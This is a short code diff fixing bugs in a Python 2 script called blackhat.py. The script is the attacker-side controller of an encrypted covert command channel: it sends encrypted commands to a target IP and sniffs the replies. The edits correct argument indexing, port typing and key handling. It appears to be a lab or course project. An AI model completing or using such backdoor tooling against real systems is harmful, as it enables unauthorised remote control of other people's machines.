@@ -59,10 +59,10 @@ def usage():
         print "Please use format python blackhat.py <targetIP> <sourcePort> <dstPort> <ttlKey> <encryptionKey> <IV>"
         sys.exit()
     else:
-        if len(sys.argv[4]) < 16:
+        if len(sys.argv[5]) < 16:
             print "Please ensure that the key is 16 characters long"
             sys.exit()
-        if len(sys.argv[5]) < 16:
+        if len(sys.argv[6]) < 16:
             print "Please ensure that the initialization vector is 16 characters long"
             sys.exit()
         targetIP = sys.argv[1]
@@ -70,7 +70,7 @@ def usage():
         global sourcePort
         sourcePort = sys.argv[2]
         print "START Sending from Blackhat port: %s"%(sourcePort)
-        dstPort = sys.argv[3]
+        dstPort = int(sys.argv[3])
         print "Send to destination port: " + str(dstPort)
         ttlKey = int(sys.argv[4])
         print "TTL Key is " + str(ttlKey)
@@ -115,8 +115,8 @@ def encryptCommand(command):
 --      and decrypts is using the same key and IV used at the attackers system.
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def decryptCommand(command):
-    global decryptionKey
-    decryptionKey = decryptionKey
+    global encryptionKey
+    decryptionKey = encryptionKey
     print "decryptionKey is " + decryptionKey
     global IV
     IV = IV
@@ -211,4 +211,4 @@ if __name__ == "__main__":
             sendCommand(encryptCommand(command))
             global sourcePort
             print sourcePort
-            sniff(timeout=1, filter="tcp and dst port " + sourcePort + " and src port " + dstPort, stop_filter=commandResult)
+            sniff(timeout=1, filter="tcp and dst port " + sourcePort + " and src port " + str(dstPort), stop_filter=commandResult)
